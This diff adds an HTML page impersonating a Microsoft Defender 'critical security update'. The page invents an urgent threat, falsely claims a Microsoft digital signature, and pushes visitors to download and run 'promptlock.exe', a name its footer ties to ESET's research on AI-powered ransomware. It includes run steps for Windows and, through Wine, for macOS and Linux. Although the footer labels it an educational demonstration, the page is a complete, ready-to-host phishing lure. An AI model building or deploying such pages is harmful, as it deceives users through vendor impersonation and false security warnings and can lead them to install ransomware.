@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Update - Microsoft Defender</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Segoe UI Web (West European)', 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', sans-serif;
+            background-color: #ffffff;
+            color: #323130;
+            line-height: 1.42857143;
+            font-size: 14px;
+        }
+        
+        .header {
+            background: #ffffff;
+            border-bottom: 1px solid #edebe9;
+            padding: 0;
+            height: 48px;
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 16px;
+            display: flex;
+            align-items: center;
+            height: 100%;
+        }
+        
+        .microsoft-logo {
+            font-size: 16px;
+            font-weight: 600;
+            color: #323130;
+            text-decoration: none;
+        }
+        
+        .main-content {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        
+        .security-alert {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 2px;
+            padding: 16px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: flex-start;
+        }
+        
+        .alert-icon {
+            color: #d13438;
+            font-size: 20px;
+            margin-right: 12px;
+            margin-top: 2px;
+        }
+        
+        .alert-content h2 {
+            color: #d13438;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .alert-content p {
+            color: #323130;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        
+        .page-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 16px;
+            line-height: 1.2;
+        }
+        
+        .page-subtitle {
+            font-size: 16px;
+            color: #605e5c;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        
+        .info-box {
+            background: #f3f2f1;
+            border: 1px solid #edebe9;
+            border-radius: 2px;
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+        
+        .info-box h3 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 12px;
+        }
+        
+        .info-box p {
+            color: #323130;
+            margin-bottom: 8px;
+        }
+        
+        .download-section {
+            background: #f3f2f1;
+            border: 1px solid #edebe9;
+            border-radius: 2px;
+            padding: 24px;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        
+        .download-btn {
+            display: inline-block;
+            background: #0078d4;
+            color: white;
+            padding: 8px 16px;
+            text-decoration: none;
+            border-radius: 2px;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.1s;
+        }
+        
+        .download-btn:hover {
+            background: #106ebe;
+        }
+        
+        .file-details {
+            background: #ffffff;
+            border: 1px solid #edebe9;
+            border-radius: 2px;
+            padding: 16px;
+            margin-top: 16px;
+            text-align: left;
+        }
+        
+        .file-details table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .file-details td {
+            padding: 4px 0;
+            font-size: 13px;
+            color: #605e5c;
+        }
+        
+        .file-details td:first-child {
+            font-weight: 600;
+            color: #323130;
+            width: 120px;
+        }
+        
+        .steps-box {
+            background: #f3f2f1;
+            border: 1px solid #edebe9;
+            border-radius: 2px;
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+        
+        .steps-box h3 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 16px;
+        }
+        
+        .steps-box ol {
+            margin-left: 20px;
+        }
+        
+        .steps-box li {
+            color: #323130;
+            margin-bottom: 8px;
+            line-height: 1.5;
+        }
+        
+        .steps-box code {
+            background: #f3f2f1;
+            border: 1px solid #edebe9;
+            border-radius: 2px;
+            padding: 2px 4px;
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 13px;
+        }
+        
+        .footer {
+            background: #f3f2f1;
+            border-top: 1px solid #edebe9;
+            padding: 24px 20px;
+            text-align: center;
+            color: #605e5c;
+            font-size: 12px;
+        }
+        
+        .footer p {
+            margin-bottom: 4px;
+        }
+        
+        .footer a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .urgency-badge {
+            display: inline-block;
+            background: #d13438;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 2px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <a href="#" class="microsoft-logo">Microsoft</a>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="urgency-badge">CRITICAL SECURITY ALERT</div>
+        
+        <h1 class="page-title">Security Update Required</h1>
+        <p class="page-subtitle">Microsoft Defender has detected a critical vulnerability that requires immediate attention. This security update addresses a newly discovered threat that could compromise your system.</p>
+
+        <div class="security-alert">
+            <div class="alert-icon">⚠</div>
+            <div class="alert-content">
+                <h2>Action Required</h2>
+                <p>Your system is currently vulnerable to a newly identified security threat. This vulnerability could allow unauthorized access to your files and personal information.</p>
+                <p><strong>Impact:</strong> Potential data breach and system compromise</p>
+                <p><strong>Solution:</strong> Install the security update immediately</p>
+            </div>
+        </div>
+
+        <div class="info-box">
+            <h3>About This Update</h3>
+            <p>This security update addresses a critical vulnerability in the system that could be exploited by malicious software. The update includes enhanced protection mechanisms and security patches.</p>
+            <p>Microsoft recommends installing this update as soon as possible to ensure your system remains secure.</p>
+        </div>
+
+        <div class="download-section">
+            <h3>Download Security Update</h3>
+            <p>Click the button below to download and install the security update.</p>
+            <a href="promptlock.exe" class="download-btn" download>
+                Download Update
+            </a>
+            
+            <div class="file-details">
+                <table>
+                    <tr>
+                        <td>File name:</td>
+                        <td>promptlock.exe</td>
+                    </tr>
+                    <tr>
+                        <td>File size:</td>
+                        <td>2.3 MB</td>
+                    </tr>
+                    <tr>
+                        <td>File type:</td>
+                        <td>Security Update</td>
+                    </tr>
+                    <tr>
+                        <td>Digital signature:</td>
+                        <td>Microsoft Corporation</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <div class="steps-box">
+            <h3>Installation Instructions</h3>
+            <ol>
+                <li><strong>Download</strong> the security update using the button above</li>
+                <li><strong>Windows:</strong> Double-click the downloaded file to run the installer</li>
+                <li><strong>macOS:</strong> Install Wine, then run <code>wine promptlock.exe</code></li>
+                <li><strong>Linux:</strong> Install Wine, then run <code>wine promptlock.exe</code></li>
+                <li><strong>Restart</strong> your computer when prompted to complete the installation</li>
+            </ol>
+        </div>
+
+        <div class="info-box">
+            <h3>What This Update Does</h3>
+            <p>• Fixes critical security vulnerabilities</p>
+            <p>• Enhances system protection against malware</p>
+            <p>• Updates security definitions</p>
+            <p>• Improves overall system security</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2024 Microsoft Corporation. All rights reserved.</p>
+        <p>This is a security demonstration for educational purposes only.</p>
+        <p>Reference: <a href="https://cyberscoop.com/prompt-lock-eset-ransomware-research-ai-powered-prompt-injection/" target="_blank">ESET PromptLock Research</a></p>
+    </div>
+</body>
+</html> 
+</html> 
